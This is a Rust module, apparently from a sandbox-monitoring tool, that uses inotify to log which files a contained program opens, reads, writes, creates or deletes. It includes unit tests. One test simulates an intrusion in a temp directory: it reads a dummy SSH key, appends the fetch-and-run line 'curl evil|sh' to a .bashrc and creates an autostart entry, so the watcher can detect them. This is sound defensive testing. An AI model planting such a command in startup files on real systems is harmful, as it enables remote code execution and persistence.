//! Sees every open, read, write, create and delete in a directory tree, from outside the sandbox, without root.
//! inotify follows inodes, so accesses made through the container's bind mount show up here.
//! It does not say *who* did it: that is the kernel tracer's job.

use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
use std::ffi::CString;
use std::fs;
use std::io;
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread::JoinHandle;

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Op {
    List,
    Open,
    Read,
    Write,
    Create,
    Delete,
    Move,
}

impl Op {
    pub fn word(self) -> &'static str {
        match self {
            Op::List => "listed",
            Op::Open => "opened",
            Op::Read => "read",
            Op::Write => "wrote",
            Op::Create => "created",
            Op::Delete => "deleted",
            Op::Move => "moved",
        }
    }
}

#[derive(Default, Debug)]
pub struct Touches {
    /// Path relative to the watched root ("" is the root itself) → what was done to it.
    pub ops: BTreeMap<PathBuf, BTreeSet<Op>>,
    /// Events were lost (queue overflow or watch limit): the list is incomplete.
    pub incomplete: bool,
}

const MASK: u32 = libc::IN_OPEN
    | libc::IN_ACCESS
    | libc::IN_MODIFY
    | libc::IN_CLOSE_WRITE
    | libc::IN_CLOSE_NOWRITE
    | libc::IN_CREATE
    | libc::IN_DELETE
    | libc::IN_MOVED_FROM
    | libc::IN_MOVED_TO
    | libc::IN_ONLYDIR
    | libc::IN_DONT_FOLLOW
    | libc::IN_EXCL_UNLINK;

struct State {
    fd: i32,
    root: PathBuf,
    dirs: HashMap<i32, PathBuf>,
    /// Directories we are listing ourselves (to watch what is inside): their open/read events are ours, not the program's.
    /// shortcut: if the program lists the same new directory at the same instant, that listing is missed; acceptable.
    ours: HashSet<PathBuf>,
    touches: Touches,
}

impl State {
    fn record(&mut self, path: &Path, op: Op) {
        let rel = path.strip_prefix(&self.root).unwrap_or(path).to_path_buf();
        self.touches.ops.entry(rel).or_default().insert(op);
    }

    /// Watches `dir` and everything below. `created`: the program just made it, so its content counts as created too
    /// (files written before our watch existed would otherwise be missed).
    fn add_tree(&mut self, dir: &Path, created: bool) {
        let c = CString::new(dir.as_os_str().as_bytes()).unwrap();
        let wd = unsafe { libc::inotify_add_watch(self.fd, c.as_ptr(), MASK) };
        if wd < 0 {
            self.touches.incomplete = true; // ENOSPC (watch limit) or the directory is already gone
            return;
        }
        self.dirs.insert(wd, dir.to_path_buf());
        self.ours.insert(dir.to_path_buf());
        let Ok(entries) = fs::read_dir(dir) else {
            return;
        };
        for e in entries.flatten() {
            let p = e.path();
            if created {
                self.record(&p, Op::Create);
            }
            if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                self.add_tree(&p, created);
            }
        }
    }

    fn handle(&mut self, wd: i32, mask: u32, name: &[u8]) {
        if mask & libc::IN_Q_OVERFLOW != 0 {
            self.touches.incomplete = true;
            return;
        }
        if mask & libc::IN_IGNORED != 0 {
            self.dirs.remove(&wd);
            return;
        }
        let Some(dir) = self.dirs.get(&wd) else {
            return;
        };
        let path = if name.is_empty() {
            dir.clone()
        } else {
            dir.join(std::ffi::OsStr::from_bytes(name))
        };
        let is_dir = name.is_empty() || mask & libc::IN_ISDIR != 0;
        if is_dir && self.ours.contains(&path) {
            if mask & libc::IN_CLOSE_NOWRITE != 0 {
                self.ours.remove(&path); // our listing is over; from now on, opens are the program's
            }
            return;
        }
        // a child directory is reported twice (by its parent and by its own watch): keep the parent's view only
        if name.is_empty() && mask & (libc::IN_OPEN | libc::IN_ACCESS) != 0 && path != self.root {
            return;
        }
        let op = if mask & libc::IN_OPEN != 0 || mask & libc::IN_ACCESS != 0 {
            if is_dir {
                Op::List
            } else if mask & libc::IN_ACCESS != 0 {
                Op::Read
            } else {
                Op::Open
            }
        } else if mask & (libc::IN_MODIFY | libc::IN_CLOSE_WRITE) != 0 {
            Op::Write
        } else if mask & libc::IN_CREATE != 0 {
            Op::Create
        } else if mask & libc::IN_DELETE != 0 {
            Op::Delete
        } else if mask & (libc::IN_MOVED_FROM | libc::IN_MOVED_TO) != 0 {
            Op::Move
        } else {
            return; // IN_CLOSE_NOWRITE alone: nothing new
        };
        self.record(&path, op);
        if is_dir && mask & (libc::IN_CREATE | libc::IN_MOVED_TO) != 0 {
            self.add_tree(&path, true);
        }
    }

    /// Reads what is queued. Returns how many events were read.
    fn pump(&mut self) -> io::Result<usize> {
        let mut buf = vec![0u8; 64 * 1024];
        let n = unsafe { libc::read(self.fd, buf.as_mut_ptr().cast(), buf.len()) };
        if n < 0 {
            let e = io::Error::last_os_error();
            return if e.kind() == io::ErrorKind::WouldBlock {
                Ok(0)
            } else {
                Err(e)
            };
        }
        let (n, hdr) = (n as usize, std::mem::size_of::<libc::inotify_event>());
        let (mut off, mut count) = (0, 0);
        while off + hdr <= n {
            let ev: libc::inotify_event =
                unsafe { std::ptr::read_unaligned(buf.as_ptr().add(off).cast()) };
            let raw = &buf[off + hdr..(off + hdr + ev.len as usize).min(n)];
            let name = &raw[..raw.iter().position(|&b| b == 0).unwrap_or(raw.len())];
            self.handle(ev.wd, ev.mask, name);
            off += hdr + ev.len as usize;
            count += 1;
        }
        Ok(count)
    }

    fn wait(&self, ms: i32) -> bool {
        let mut p = libc::pollfd {
            fd: self.fd,
            events: libc::POLLIN,
            revents: 0,
        };
        unsafe { libc::poll(&mut p, 1, ms) > 0 }
    }
}

impl Drop for State {
    fn drop(&mut self) {
        unsafe { libc::close(self.fd) };
    }
}

pub struct Watcher {
    stop: Arc<AtomicBool>,
    thread: JoinHandle<io::Result<Touches>>,
}

impl Watcher {
    /// Every watch is in place when this returns.
    pub fn start(root: &Path) -> io::Result<Watcher> {
        let fd = unsafe { libc::inotify_init1(libc::IN_NONBLOCK | libc::IN_CLOEXEC) };
        if fd < 0 {
            return Err(io::Error::last_os_error());
        }
        let mut st = State {
            fd,
            root: root.to_path_buf(),
            dirs: HashMap::new(),
            ours: HashSet::new(),
            touches: Touches::default(),
        };
        st.add_tree(root, false);
        if st.dirs.is_empty() {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                format!("cannot watch {}", root.display()),
            ));
        }
        let stop = Arc::new(AtomicBool::new(false));
        let flag = stop.clone();
        let thread = std::thread::spawn(move || {
            loop {
                let stopping = flag.load(Ordering::Acquire);
                if st.wait(100) {
                    st.pump()?;
                } else if stopping {
                    break; // asked to stop and the queue stayed empty for 100 ms: drained
                }
            }
            Ok(std::mem::take(&mut st.touches))
        });
        Ok(Watcher { stop, thread })
    }

    pub fn stop(self) -> io::Result<Touches> {
        self.stop.store(true, Ordering::Release);
        self.thread
            .join()
            .map_err(|_| io::Error::other("watcher thread panicked"))?
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{Read, Write};

    fn ops(t: &Touches, p: &str) -> Vec<Op> {
        t.ops
            .get(Path::new(p))
            .map(|s| s.iter().copied().collect())
            .unwrap_or_default()
    }

    #[test]
    fn sees_what_another_process_does() {
        let root = std::env::temp_dir().join(format!("chouf-watch-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);
        fs::create_dir_all(root.join(".ssh")).unwrap();
        fs::write(root.join(".ssh/id_ed25519"), "secret").unwrap();
        fs::write(root.join(".bashrc"), "# rc").unwrap();
        fs::write(root.join("untouched"), "x").unwrap();
        let w = Watcher::start(&root).unwrap();

        let mut s = String::new();
        fs::File::open(root.join(".ssh/id_ed25519"))
            .unwrap()
            .read_to_string(&mut s)
            .unwrap();
        let _ = fs::read_dir(root.join(".ssh")).unwrap().count();
        fs::OpenOptions::new()
            .append(true)
            .open(root.join(".bashrc"))
            .unwrap()
            .write_all(b"\ncurl evil|sh\n")
            .unwrap();
        // a whole tree made at once: what is inside must not be missed
        fs::create_dir_all(root.join(".config/autostart")).unwrap();
        fs::write(root.join(".config/autostart/x.desktop"), "[Desktop Entry]").unwrap();
        fs::remove_file(root.join("untouched")).unwrap();
        let _ = fs::metadata(root.join(".bashrc")); // stat is not an access

        let t = w.stop().unwrap();
        assert_eq!(ops(&t, ".ssh/id_ed25519"), vec![Op::Open, Op::Read]);
        assert_eq!(ops(&t, ".ssh"), vec![Op::List]);
        assert!(ops(&t, ".bashrc").contains(&Op::Write));
        assert!(ops(&t, ".config").contains(&Op::Create));
        assert!(
            ops(&t, ".config/autostart/x.desktop").contains(&Op::Create),
            "{t:?}"
        );
        assert_eq!(ops(&t, "untouched"), vec![Op::Delete]);
        assert!(!t.incomplete);
        fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn our_own_bookkeeping_is_not_reported() {
        let root = std::env::temp_dir().join(format!("chouf-watch-quiet-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);
        fs::create_dir_all(root.join("a/b/c")).unwrap();
        let t = Watcher::start(&root).unwrap().stop().unwrap();
        assert!(t.ops.is_empty(), "{t:?}");
        fs::remove_dir_all(root).unwrap();
    }
}
